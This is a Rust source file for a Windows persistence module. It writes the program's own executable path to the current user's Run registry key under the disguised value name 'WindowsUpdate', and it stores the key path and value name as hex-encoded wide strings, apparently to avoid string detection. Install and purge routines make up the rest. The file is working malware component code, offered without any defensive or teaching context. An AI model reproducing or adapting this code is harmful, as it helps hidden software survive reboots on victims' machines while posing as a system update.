//! persist.rs — Registry run-key persistence
#![allow(dead_code, non_snake_case)]

use winapi::um::winreg::{
    RegOpenKeyExW, RegSetValueExW, RegDeleteValueW, RegCloseKey,
    HKEY_CURRENT_USER,
};
use winapi::shared::minwindef::{HKEY, DWORD};
use winapi::um::winnt::KEY_SET_VALUE;

// Run key path and value name (wide, null-terminated)
const RUN_KEY: &[u16] = &[
    0x53,0x6F,0x66,0x74,0x77,0x61,0x72,0x65,0x5C, // Software\
    0x4D,0x69,0x63,0x72,0x6F,0x73,0x6F,0x66,0x74,0x5C, // Microsoft\
    0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x5C, // Windows\
    0x43,0x75,0x72,0x72,0x65,0x6E,0x74,0x56,0x65,0x72,0x73,0x69,0x6F,0x6E,0x5C, // CurrentVersion\
    0x52,0x75,0x6E,0x00, // Run\0
];

const VAL_NAME: &[u16] = &[
    0x57,0x69,0x6E,0x64,0x6F,0x77,0x73,0x55,0x70,0x64,0x61,0x74,0x65,0x00, // WindowsUpdate\0
];

unsafe fn get_exe_path_wide() -> Vec<u16> {
    let mut buf = vec![0u16; 520];
    let len = winapi::um::libloaderapi::GetModuleFileNameW(
        core::ptr::null_mut(), buf.as_mut_ptr(), buf.len() as DWORD,
    );
    buf.truncate(len as usize + 1); // keep null
    buf
}

/// Install run-key pointing at our own exe path.
pub unsafe fn install(path: &str) {
    let _ = path; // use own exe path
    let exe = get_exe_path_wide();
    let mut hkey: winapi::shared::minwindef::HKEY = core::ptr::null_mut();
    if RegOpenKeyExW(
        HKEY_CURRENT_USER,
        RUN_KEY.as_ptr(),
        0,
        KEY_SET_VALUE,
        &mut hkey,
    ) != 0 { return; }
    let byte_len = exe.len() * 2;
    RegSetValueExW(
        hkey,
        VAL_NAME.as_ptr(),
        0,
        1, // REG_SZ
        exe.as_ptr() as *const u8,
        byte_len as DWORD,
    );
    RegCloseKey(hkey);
}

/// Remove our run-key value.
pub unsafe fn uninstall() {
    let mut hkey: winapi::shared::minwindef::HKEY = core::ptr::null_mut();
    if RegOpenKeyExW(
        HKEY_CURRENT_USER,
        RUN_KEY.as_ptr(),
        0,
        KEY_SET_VALUE,
        &mut hkey,
    ) != 0 { return; }
    let ok = RegDeleteValueW(hkey, VAL_NAME.as_ptr()) == 0;
    RegCloseKey(hkey);
    let _ = ok;
}

/// Install all persistence mechanisms.
pub unsafe fn install_all() {
    install("");
}

/// Purge all persistence mechanisms.
pub unsafe fn purge_all() {
    uninstall();
}
